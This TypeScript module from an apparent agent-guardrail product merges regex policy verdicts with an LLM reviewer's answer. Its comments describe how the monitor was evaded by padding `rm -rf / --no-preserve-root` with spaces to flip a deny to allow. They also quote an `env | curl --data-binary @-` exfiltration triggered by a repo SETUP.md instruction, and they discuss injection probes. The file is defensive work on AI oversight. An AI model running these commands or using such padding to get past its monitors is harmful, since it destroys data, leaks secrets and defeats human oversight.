/**
 * The two-tier combine rules: regex policy verdicts + Jev's review → one
 * final verdict, plus what to record about how it was reached.
 *
 * Pure and synchronous, importing only types and one constant from the equally
 * pure `jev-activity.ts`, so it can sit on the hook path (`policy-evaluator.ts`
 * imports it) without pulling the semantic evaluator into the bundle, and so
 * every row of the table below is testable offline.
 *
 * | Situation                                     | Result                                                      |
 * |-----------------------------------------------|-------------------------------------------------------------|
 * | not configured / FAILPROOFAI_EVALUATOR=legacy | `regexOnly` — never reaches this module's `combineTwoTier`  |
 * | any HARD deny                                 | the regex result (Jev was aborted, so nothing is cleared)   |
 * | Jev degraded — transport, timeout, 429, 402,  | the regex result, every deny counts; recorded `jev-fallback`|
 * | 5xx, malformed, model mismatch                |                                                             |
 * | Jev answered, but part of the CALL was cut    | nothing is cleared, so every regex deny counts; Jev's own   |
 * |                                               | verdict still joins the most-severe rule; recorded          |
 * |                                               | `jev-fallback` / `request-cut`, with its decision           |
 * | Jev answered, but a MESSAGE was cut — a human | exactly the row below: the clears stand, and it is NOT      |
 * | turn, the agent's last message, or a prompt   | recorded as a fallback                                      |
 * | the intent store had already capped           |                                                             |
 * | Jev answered                                  | reviewable denies/instructs Jev covered are cleared; final =|
 * |                                               | the most severe of {remaining regex results, Jev's verdict} |
 *
 * `shadow` mode computes and records all of it, and still returns the regex
 * result.
 *
 * ## Where this departs from plan §4
 *
 * §4's combine table files BOTH cuts under one row — "Jev degraded (timeout,
 * 429, HTTP/parse error, model-version mismatch) **or the envelope was
 * truncated** → today's regex result (every deny counts); record
 * `evaluator: "jev-fallback"` plus the reason". The two rows above are that
 * row as shipped, and if you arrived from §4 these are the two differences,
 * stated once so nothing below is a surprise:
 *
 * 1. **A cut MESSAGE is not a fallback at all.** Nothing about the CALL was
 *    missing and nothing was withheld, so the clears stand and the row is
 *    recorded `jev`. Filing it as a fallback made the length of the human's
 *    own paste decide the verdict — the same call came out `allow` after a
 *    77-character prompt and `deny` after a 3,000-character one — and inflated
 *    the fallback rate with calls Jev answered in full. "What a cut MESSAGE
 *    does: nothing", below, is the argument at length.
 * 2. **A cut CALL is a fallback, but not "exactly the regex result".** It
 *    clears nothing, so every regex deny counts, which is the half of §4 that
 *    protects anything. What it does NOT do is throw Jev's own answer away:
 *    that answer still joins the most-severe merge, upward only. Reading §4 as
 *    "discard the verdict" made padding a command past the envelope's cap a
 *    working way to stop Jev's OWN deny applying (a real repro: `rm -rf /
 *    --no-preserve-root` + 2,100 spaces flipped deny → allow). A cut is
 *    attacker-influenceable, so it may never SUBTRACT severity.
 *
 * One principle underneath both: a partial picture withdraws CLEARS and
 * nothing else. §4's guarantee — a call the tier could not read whole can
 * never come out more permissive than the regex tier alone — holds in full,
 * and `combineTwoTier`'s result is never less severe than `regexOnly(verdicts)`
 * unless a clear fired. What changed is the direction the rule is allowed to
 * move a verdict, not whether the regex floor survives. The user-facing page
 * (docs/policies/jev-byok.mdx, "When Jev cannot answer") states both rows in
 * the same terms, and `combine.test.ts` plus `truncation-severity.test.ts` pin
 * them.
 *
 * "Jev can only clear what it was actually asked about": a reviewable
 * policy's deny or instruct is cleared only if EVERY semantic policy named in
 * its `reviewedBy` was among the ones put to Jev for this call AND did not
 * come back `deny` — that is, it answered `none`, `overridden` or `instruct`.
 * A name Jev was not asked about — its precondition was false, the tool class
 * did not apply, the name is misspelled — keeps the regex verdict standing.
 *
 * ## A warning-level answer clears the deny, and leaves the warning
 *
 * The rule above is the one thing about this module that was chosen on
 * measured numbers rather than argued from first principles, so this is what
 * it decides and what it deliberately does not.
 *
 * An `instruct` answer means the named check looked at the call, found the
 * thing the regex policy is worried about, and judged it worth a WARNING —
 * not a block. Counting that as "not cleared" left the regex DENY standing,
 * which threw the distinction away: the agent was stopped by a string match
 * on exactly the calls where the check that was supposed to review it had
 * already said "warn, do not stop". Over the 1,332 labelled cases that was
 * the single largest remaining group of false blocks. Measured on this
 * commit, over recorded provider answers for all 1,332 (the live Cloudflare
 * run they were recorded from reproduces case for case under the previous
 * rule): real work blocked 13.9% → 8.7% — 12.5% → 7.3% leaving out the
 * always-on self-protection guard, which is hard and unclearable — against
 * 33.3% for the regex tier alone, attacks blocked 134 → 132 of 234, exact
 * agreement with the labels 70.6% → 70.8%. The live run on which the rule was
 * chosen put the same four at 14.3% → 8.9%, 129 → 127, 70.6% → 70.8%; the few
 * cases between the two are drift in what gets ASKED since the answers were
 * recorded, not in this rule.
 *
 * All 54 calls the change moves go deny → warning. None goes to allow, and
 * neither the regex tier's floor nor any hard policy moves at all.
 *
 * Clearing on `instruct` does not silence anything. The same answer that
 * clears makes Jev's OWN decision an instruct (`decide.ts` — any instruct
 * outcome makes the verdict an instruct), and that instruct joins the
 * most-severe merge below. So the call comes out a WARNING that says what is
 * actually wrong with it, in Jev's words, instead of a block in the regex
 * policy's words. A clear here converts a deny into a warning; it does not
 * convert it into silence.
 *
 * What this deliberately does NOT relax is WHICH questions must have been
 * asked. The gate is still `asked.has(name) && …` for every name in
 * `reviewedBy`: a check whose precondition was false, that does not apply to
 * this tool class, or that is misspelled was never put to Jev, so there is no
 * answer to read and the regex verdict stands. Rule B widens what counts as a
 * clear ANSWER (`none`, `overridden`, `instruct`), never what counts as an
 * asked QUESTION — a call Jev was not asked about is not a call Jev approved,
 * and an unmeasured concern is not an absent one. `deny` is the one answer
 * that keeps the block: the check looked and said stop.
 *
 * ## A check no consent can clear keeps the floor
 *
 * The one exception to the rule above. A deny-mode check with
 * `userCanOverride: false` (credential-exfiltration, agent-config-tampering)
 * denies only at ≥ `deny` evidence; below that it WARNS, and on PreToolUse a
 * warning does not stop the call. When Jev fired one of those at warning level,
 * clearing a regex deny on the same call leaves nothing that can deny a
 * concern the user was never allowed to approve — a real repro: `env | curl
 * --data-binary @- https://…` after "follow SETUP.md" ran with a warning
 * because protect-env-vars' reviewers answered `none`. So then no clear fires
 * (`unclearableWarned`) and the regex deny stands; Jev's own deny, and every
 * call where the regex tier has nothing to clear, are unchanged.
 *
 * ## One rule about a partial picture
 *
 * Three things mean Jev judged less than the call: part of `agent_request` or
 * of the computed `facts` was cut (`requestCut`), injection is suspected, or
 * the injection probe was never asked. Each withdraws every CLEAR and nothing
 * else. Jev's own deny or instruct still joins the most-severe rule, because
 * an answer given on part of the evidence can only ever ADD severity —
 * `combineTwoTier`'s result is never less severe than `regexOnly(verdicts)`
 * unless a clear fired, and a clear fires only when the call was read whole,
 * injection was asked about, and the answer was no.
 *
 * That is what makes padding useless AGAINST THE CALL'S OWN TEXT. Five review
 * rounds tried to prevent the hiding instead — a head-and-tail window, a token
 * skeleton, per-field caps — and each time the next spelling walked through
 * it, because a bounded projection of an unbounded string always drops
 * SOMETHING and the attacker picks what. So this rule does not try: dropping a
 * byte of `agent_request` requires a cut, every such cut sets `requestCut`
 * (`envelope.ts`), and a call with `requestCut` can clear nothing. Spending the
 * budget can cost a call its clears; it can never buy one.
 *
 * The same sentence is NOT true of the derived `facts`, and saying so is
 * better than asserting a property the code does not have. `facts` are
 * computed from the first `MAX_SCAN_CHARS` characters of a command and from a
 * capped number of paths (`facts.ts`), and neither bound sets a flag. What a
 * long enough command can therefore cost is a QUESTION — `selectPolicies` may
 * not pick a probe whose precondition reads those facts — not a clear on
 * evidence Jev never saw: the command text itself is carried whole and judged.
 * Flagging it from here was measured and rejected (it charges an ordinary
 * 20,000-character heredoc, and `prettier --write` over thirteen files, their
 * clears); the narrow fix is for `facts.ts` to report that it stopped and for
 * `policies.ts` to read incomplete evidence as a reason to ASK MORE. Until
 * that lands, this paragraph — not the one above it — is what holds. See
 * `envelope.ts`'s header for the same statement at the source.
 *
 * ## What size may NOT do
 *
 * A previous revision went one step further and DENIED a call whose own text
 * had been cut — `semantic/request-too-large-to-review`, telling the agent to
 * split it up. That is gone, and it is worth saying why, because the argument
 * for it was not silly: in the case this tier exists for, the regex tier has
 * no rule, so its floor is `allow`, and withdrawing clears protects nothing.
 *
 * It was still wrong. The refusal was a deny this product invented, on work no
 * policy objected to, at a threshold ordinary calls reach — a ~1,400-line
 * `Write`, a large MCP body, a long generated migration. The whole reason this
 * tier exists is that regex policies block a third of real work; a new
 * refusal of our own, firing on size rather than on behaviour, spends the
 * benefit it was built to deliver. And it is not even the strongest available
 * answer: Jev is still ASKED, with whatever fitted, and a cut call that is
 * actually dangerous is denied on Jev's own verdict, with a reason that names
 * what is wrong with it rather than how long it is.
 *
 * So: size can only ever make a call stricter through Jev's own verdict or
 * through a regex policy, never through a refusal here. What it costs is the
 * clears.
 *
 * ## What a cut MESSAGE does: nothing
 *
 * `truncated` — a human turn, an agent message or a store-capped prompt that
 * did not fit — is recorded and read no further. It used to withdraw clears
 * too, and that made the length of the human's own prompt decide the verdict:
 * the same call came out `allow` after a 77-character prompt and `deny` after
 * a 3,000-character one, because the clearing half of the tier switched off.
 * Pasting a spec or a stack trace is not an attack, the human's turn is not a
 * channel the agent can write, and consent read out of it is checked locally
 * against the UNCUT text (see `Envelope.evidence`), so there is nothing here
 * for a cut to protect.
 *
 * What the clearing gate claims, exactly. The envelope keeps a BOUNDED window
 * by design — the last `MAX_USER_MESSAGES` human turns — and dropping older
 * turns does not set `truncated`. So a clear rests on a complete view of what
 * was SENT, not on the whole session: an instruction from twenty turns ago is
 * not in the picture, and the tier is not a record of consent over a session.
 *
 * The local `targetNamedByUser` check reads `Envelope.evidence`, which is that
 * window and nothing wider — a turn Jev never saw cannot supply the consent
 * for an `op-requested` override (it could, and flipped a reviewable deny to
 * allow). The two channels differ inside the window,
 * deliberately, and the guarantee is per channel rather than per character:
 *   - `user_said` is reported UNCUT. A target named in the cut middle of a
 *     long prompt is consent the human typed, and treating it as absent turned
 *     explicit requests into instructs and denies.
 *   - `agent_last_message` is reported as SENT, capped and redacted. The agent
 *     writes that channel and it repeats third-party text, so consent found
 *     only in a part of it Jev never read is exactly the subtraction this
 *     design refuses everywhere else.
 *
 * "Uncut" there means uncut by the ENVELOPE, and there is one cut it cannot
 * undo: T4's intent store caps a prompt as it READS it (`intent.ts`), so a
 * 12,000-character prompt arrives already head-and-tail cut and its middle is
 * not recoverable by anyone. Run over that, the local substring check read
 * "the user did not name it" off a string that could not have contained it —
 * the same subtraction one channel further out, and the same symptom: the
 * length of the human's paste decided the verdict. So a human turn that
 * arrived cut makes the local check INCONCLUSIVE rather than negative
 * (`PreparedCall.userSaidCut`, `DecideV1Options.userSaidCut`), and the
 * override rests on what it rests on when a call names no identifiable target
 * at all — Jev's own `op_requested` and `scope` answers. It can only restore a
 * clear a short prompt would have kept, it is read from the human channel
 * only, and `targetNamedByUser` still reports FALSE, because nothing in what
 * we hold named the target; what changes is that "false" no longer decides.
 *
 * Severity, meanwhile, is never subtracted by a cut at all. §4's table files a
 * truncated envelope under "fall back to the regex result", and reading that
 * as "throw Jev's answer away" made padding a command past the envelope's
 * per-field cap a working way to stop Jev's OWN deny applying (a real repro:
 * `rm -rf / --no-preserve-root` + 2,100 spaces flipped deny → allow).
 * Truncation is attacker-influenceable, so it may never subtract severity.
 * What §4 asks for is still there — every regex deny counts, and the call is
 * recorded as `jev-fallback` — the answer is just not thrown away on the way
 * in.
 *
 * Size was the same class one step further out, and is no longer a case at
 * all: a request over `MAX_REQUEST_CHARS` used to be
 * `degraded("request-too-large")` — a `fallback`, no verdict, regex-only —
 * which one ignored 70,000-character `file_path`, one long object KEY, or
 * 36,000 empty strings in an array was enough to trigger. The envelope is now
 * built inside a hard budget whose accounting charges what serialization
 * really costs, and being over it is not a degrade at all: the request is sent
 * with what fitted and arrives here `answered`, with `requestCut`.
 *
 * Structurally: a `fallback` review carries no `decision` at all, so a verdict
 * Jev actually produced cannot be filed as one. If Jev decided, it comes
 * through `answered` (possibly `requestCut`), and `answered` always reaches
 * the most-severe merge.
 *
 * A clear is only as good as the check that the call is not acting on text
 * planted by a repo, a tool result or the agent itself, so the injection probe
 * is asked on EVERY call — including one with no recorded human message, where
 * there is no consent to withdraw but there is still planted text to notice.
 * `injectionAsked` false therefore means the request was never sent at all,
 * and then there is nothing to clear anyway.
 */
import type { PolicyAuthority } from "../policy-types";
// The only value imports, and deliberately from the activity vocabulary rather
// than local literals: the fallback reason this module writes itself has to
// be a code the activity store's closed list names, or it is stored and
// shipped as `other`, and a shadow verdict's model id has to pass the same
// shape check the row's own `jevModel` does. Importing them makes a rename a
// compile error here. `jev-activity.ts` is pure (no node imports, no semantic
// modules), so this costs the hook path nothing.
import { JEV_MODEL_RE, JEV_REASON_REQUEST_CUT } from "../jev-activity";

export type Decision = "allow" | "deny" | "instruct";
export type JevMode = "shadow" | "enforce";

/** One regex policy's verdict, in evaluation order. */
export interface RegexVerdict {
  policyName: string;
  decision: Decision;
  /**
   * deny / instruct: the reason exactly as it would be shown (hint appended).
   * allow: the informational note, or null for a silent allow.
   */
  reason: string | null;
  /** EFFECTIVE authority (see `effectiveAuthority`), never the declared one. */
  authority: PolicyAuthority;
  /** The semantic policies that must all be asked and none answer `deny`. Empty for `hard`. */
  reviewedBy: readonly string[];
}

/** What Jev said, reduced to exactly what the combine rules read. */
export type JevReview =
  | {
      /** Aborted because a hard deny already decided; Jev's answer was never read. */
      kind: "not-consulted";
    }
  | {
      /**
       * Jev produced no verdict: degraded (timeout, 429, HTTP/parse error,
       * model mismatch, no transport, a config that cannot be built, …).
       *
       * Deliberately carries NO `decision`. A verdict Jev did produce must not
       * be droppable on the way into the combine — that is how padding a
       * command used to make Jev's own deny disappear — so anything Jev
       * decided comes through `answered`, whose severity is always merged.
       */
      kind: "fallback";
      reason: string;
      latencyMs: number | null;
      model: string | null;
    }
  | {
      kind: "answered";
      decision: Decision;
      reason: string | null;
      /** Attribution for Jev's own deny/instruct, e.g. `semantic/destructive-deletion`. */
      policyName: string;
      /** Semantic policies whose questions were in the request that was answered. */
      asked: readonly string[];
      /**
       * Of `asked`, the ones whose outcome was not `deny` — `none`,
       * `overridden` or `instruct`. Those are the answers that let a
       * reviewable regex verdict be cleared; see "A warning-level answer
       * clears the deny, and leaves the warning" above. Named for what it
       * holds rather than for what it is used for, because "clear" once meant
       * `none`/`overridden` only and a silent widening of that set is exactly
       * the mistake this name prevents.
       */
      notDenied: readonly string[];
      /**
       * The injection probe was in the request and answered. False → no clear:
       * an unmeasured injection is not an absent one.
       */
      injectionAsked: boolean;
      /** The injection probe held: every clear is withdrawn. */
      injected: boolean;
      /**
       * Jev fired a check no consent can clear (deny-mode, `userCanOverride:
       * false`) at WARNING level: every clear is withdrawn. See "A check no
       * consent can clear keeps the floor" above. Absent reads as false.
       */
      unclearableWarned?: boolean;
      /**
       * Something did not fit: a human turn, the agent's last message, or what
       * the intent store had already capped (`SemanticOutcome.truncated`).
       *
       * READ BY NOTHING HERE, on purpose — see "What a cut MESSAGE does"
       * above. It stays on the review so the verdict log and a future
       * diagnostic can see it, and so that the field's absence is not mistaken
       * for the cut's absence.
       */
      truncated: boolean;
      /**
       * Part of what the CALL DOES was cut: the tool input did not fit the
       * envelope's request budget, a redaction removed a span of it that could
       * have been executable, or a computed fact about it was dropped
       * (`SemanticOutcome.requestCut`). Implies `truncated`.
       *
       * Withdraws every clear — a clear resting on a call half of which was
       * never read is not a clear — and nothing else: the decision below still
       * joins the most-severe rule, so padding cannot subtract severity, and
       * it cannot add a refusal of our own either. Recorded as `jev-fallback`
       * / `request-cut`.
       */
      requestCut: boolean;
      /**
       * Null when nothing had to be sent (no semantic policy applied), or when
       * the answer came from the throttle's cache: a hit's ~0 ms is not a
       * provider latency.
       */
      latencyMs: number | null;
      model: string | null;
    };

/**
 * What `evaluatePolicies` receives when the two-tier path is on: an in-flight
 * Jev review (started before the regex policies run) and how to read each
 * registered policy's effective authority. Built by `jev-review.ts`.
 */
export interface TwoTierReview {
  mode: JevMode;
  /** Resolves once Jev answered, failed, or was aborted. Never rejects. */
  review: Promise<JevReview>;
  /** Abort the in-flight request (a hard deny decided). No-op once settled. */
  abort(): void;
  /**
   * Called once, right before the evaluator awaits `review` — by then every
   * read of the process-global policy registry for this call is done. The
   * daemon's warm worker serializes requests around that registry, and uses
   * this to let the next queued request run while this one waits on the
   * network instead of holding every hook on the machine behind it.
   */
  releaseRegistry?: () => void;
  /** Effective authority + the reviewing semantic policies (empty unless reviewable). */
  authorityOf(p: { name: string; authority?: PolicyAuthority; reviewedBy?: string[] }): {
    authority: PolicyAuthority;
    reviewedBy: string[];
  };
}

export interface FinalVerdict {
  decision: Decision;
  /** deny: exactly the one decider; instruct: every instruct; allow: every note. */
  entries: Array<{ policyName: string; reason: string }>;
}

/** The hook-activity fields (§7 contract) for one two-tier evaluation. */
export interface JevActivityFields {
  evaluator: "jev" | "jev-fallback";
  jevDecision?: Decision;
  jevCleared?: string[];
  jevFallbackReason?: string;
  jevLatencyMs?: number;
  jevModel?: string;
  jevMode: JevMode;
}

/**
 * Jev's own deny or instruct in SHADOW mode — the verdict enforce mode would
 * have applied, recorded rather than applied. The handler files it in the
 * activity row's `observed` list, the "would have" record observe-mode cloud
 * and pack policies already use, so FailproofAI Cloud's policy page counts it
 * with no change on its side.
 */
export interface ShadowVerdict {
  /** `semantic/<check>` — the name enforce mode would have attributed it to. */
  policyName: string;
  decision: "deny" | "instruct";
  /** The same fixed template reason enforce mode would have shown. */
  reason: string;
  /** The Jev model id that answered, or `jev` when it named none this build can store. */
  version: string;
}

export interface CombineOutcome {
  final: FinalVerdict;
  /** Reviewable regex policies Jev cleared (in shadow: would have cleared). */
  cleared: string[];
  /**
   * True when the first entry of `final` came from THIS TIER rather than from
   * a registered policy — today that means Jev's own verdict.
   *
   * `handler.ts` reads it to decide whether to attribute the decision to a
   * registered policy — a name it cannot find in the registry is reported as a
   * builtin, so a name that never was one must say so here.
   */
  decidedByJev: boolean;
  activity: JevActivityFields;
  /**
   * Shadow mode only, and only when Jev's own verdict was deny or instruct.
   * Absent otherwise — including every enforce outcome, where the verdict was
   * APPLIED and `decidedByJev` / the final entries already say so.
   */
  shadowVerdict?: ShadowVerdict;
}

/**
 * The regex engine's answer on its own — exactly what `evaluatePolicies`
 * returned before two tiers existed: the first deny in evaluation order wins;
 * otherwise every instruct, joined; otherwise every allow that carried a note.
 */
export function regexOnly(verdicts: readonly RegexVerdict[]): FinalVerdict {
  const deny = verdicts.find((v) => v.decision === "deny");
  if (deny) return { decision: "deny", entries: [{ policyName: deny.policyName, reason: deny.reason ?? "" }] };
  const instructs = verdicts.filter((v) => v.decision === "instruct");
  if (instructs.length > 0) {
    return { decision: "instruct", entries: instructs.map((v) => ({ policyName: v.policyName, reason: v.reason ?? "" })) };
  }
  return {
    decision: "allow",
    entries: verdicts
      .filter((v) => v.decision === "allow" && v.reason)
      .map((v) => ({ policyName: v.policyName, reason: v.reason as string })),
  };
}

/**
 * Whether Jev's answer clears this regex verdict.
 *
 * The rule, exactly: a REVIEWABLE deny or instruct that names at least one
 * reviewer is cleared when EVERY name in its `reviewedBy` was ASKED on this
 * call AND did not answer `deny` (`none`, `overridden` or `instruct` — see "A
 * warning-level answer clears the deny, and leaves the warning" above).
 *
 * The two halves are not interchangeable, and only the second was relaxed:
 * a name that was never asked still blocks the clear, whatever the others
 * said, because an unasked question has no answer to read. A `hard` verdict
 * and a reviewable one naming nobody are never cleared at all.
 */
function clears(v: RegexVerdict, asked: ReadonlySet<string>, notDenied: ReadonlySet<string>): boolean {
  if (v.decision === "allow" || v.authority !== "reviewable") return false;
  if (v.reviewedBy.length === 0) return false;
  return v.reviewedBy.every((name) => asked.has(name) && notDenied.has(name));
}

export function combineTwoTier(
  verdicts: readonly RegexVerdict[],
  review: JevReview,
  mode: JevMode,
): CombineOutcome {
  const legacy = regexOnly(verdicts);

  if (review.kind === "not-consulted") {
    // A hard deny decided. Nothing was asked, so nothing is cleared, and the
    // regex result is final — byte for byte what the regex engine says alone.
    return { final: legacy, cleared: [], decidedByJev: false, activity: { evaluator: "jev", jevMode: mode } };
  }

  if (review.kind === "fallback") {
    return {
      final: legacy,
      cleared: [],
      decidedByJev: false,
      activity: {
        evaluator: "jev-fallback",
        jevFallbackReason: review.reason,
        ...(review.latencyMs !== null ? { jevLatencyMs: review.latencyMs } : {}),
        ...(review.model ? { jevModel: review.model } : {}),
        jevMode: mode,
      },
    };
  }

  // The one gate on clearing. Every reason Jev's picture of the CALL is
  // partial lives here and here only, so the next one added cannot
  // accidentally take Jev's own severity with it (see "One rule about a
  // partial picture" above). `truncated` is deliberately not among them: see
  // "What a cut MESSAGE does".
  const wholePicture = review.injectionAsked && !review.injected && !review.requestCut;
  const asked = new Set(review.asked);
  const notDenied = new Set(review.notDenied);
  const cleared = wholePicture && !review.unclearableWarned ? verdicts.filter((v) => clears(v, asked, notDenied)).map((v) => v.policyName) : [];

  // Built once, for both modes: enforce applies it, shadow records it, and the
  // two must never disagree about what the verdict WAS.
  const jevEntry = { policyName: review.policyName, reason: review.reason ?? `Flagged by semantic review (${review.policyName})` };
  const enforced = resolveEnforce(verdicts, cleared, review.decision, jevEntry);

  const activity: JevActivityFields = {
    // §4 records a call the tier could not read whole as a fallback, and so do
    // we — its clearing half really was off. The decision below is still
    // applied (upward only), so `jev-fallback` + `request-cut` means "Jev
    // cleared nothing", while every other reason means "Jev never answered".
    // A cut MESSAGE is not a fallback: nothing about the call was missing and
    // nothing was withheld, so reporting one would only inflate the rate.
    evaluator: review.requestCut ? "jev-fallback" : "jev",
    ...(review.requestCut ? { jevFallbackReason: JEV_REASON_REQUEST_CUT } : {}),
    jevDecision: review.decision,
    // Only a clear that SOFTENED the call (in shadow: would have). One that
    // Jev's own deny, or another regex deny, still decided over changed
    // nothing — and `jev status` and the policy page's "Cleared by Jev" both
    // read `jevCleared` as calls Jev let through.
    ...(cleared.length > 0 && RANK[enforced.final.decision] < RANK[legacy.decision] ? { jevCleared: cleared } : {}),
    ...(review.latencyMs !== null ? { jevLatencyMs: review.latencyMs } : {}),
    ...(review.model ? { jevModel: review.model } : {}),
    jevMode: mode,
  };

  if (mode === "shadow") {
    // Jev's own deny or instruct, exactly as enforce mode would have applied it
    // (upward only: a cut or injected call keeps it, as the enforce branch
    // below does). A clear is recorded in `jevCleared`, not here.
    const shadowVerdict: ShadowVerdict | undefined =
      review.decision === "deny" || review.decision === "instruct"
        ? {
            policyName: jevEntry.policyName,
            decision: review.decision,
            reason: jevEntry.reason,
            // The model id is shape-checked like the row's own `jevModel`, so
            // this list can carry nothing the activity store would not.
            version: review.model && JEV_MODEL_RE.test(review.model) ? review.model : "jev",
          }
        : undefined;
    return { final: legacy, cleared, decidedByJev: false, activity, ...(shadowVerdict ? { shadowVerdict } : {}) };
  }

  return { ...enforced, cleared, activity };
}

const RANK: Record<Decision, number> = { allow: 0, instruct: 1, deny: 2 };

/** Enforce mode's verdict once `cleared` are removed: the most severe wins. */
function resolveEnforce(
  verdicts: readonly RegexVerdict[],
  cleared: readonly string[],
  decision: Decision,
  jevEntry: { policyName: string; reason: string },
): Pick<CombineOutcome, "final" | "decidedByJev"> {
  const clearedSet = new Set(cleared);
  const remaining = verdicts.filter((v) => !clearedSet.has(v.policyName));

  // Most severe wins; within a severity, the regex engine's own order first.
  const regexDeny = remaining.find((v) => v.decision === "deny");
  if (regexDeny) {
    return {
      final: { decision: "deny", entries: [{ policyName: regexDeny.policyName, reason: regexDeny.reason ?? "" }] },
      decidedByJev: false,
    };
  }
  if (decision === "deny") {
    return { final: { decision: "deny", entries: [jevEntry] }, decidedByJev: true };
  }
  // A call part of which was not shown to Jev stops HERE and no further: it
  // cleared nothing (`wholePicture` above), so every regex verdict still
  // stands and Jev's own deny already decided if there was one. There is
  // deliberately no third outcome — no refusal of this module's own — because
  // a deny nobody's policy asked for, fired by size on work nobody objected
  // to, costs more than it protects. See "What size may NOT do" above.
  const instructs = remaining
    .filter((v) => v.decision === "instruct")
    .map((v) => ({ policyName: v.policyName, reason: v.reason ?? "" }));
  if (decision === "instruct") instructs.push(jevEntry);
  if (instructs.length > 0) {
    return { final: { decision: "instruct", entries: instructs }, decidedByJev: instructs[0] === jevEntry };
  }
  return { final: regexOnly(remaining), decidedByJev: false };
}
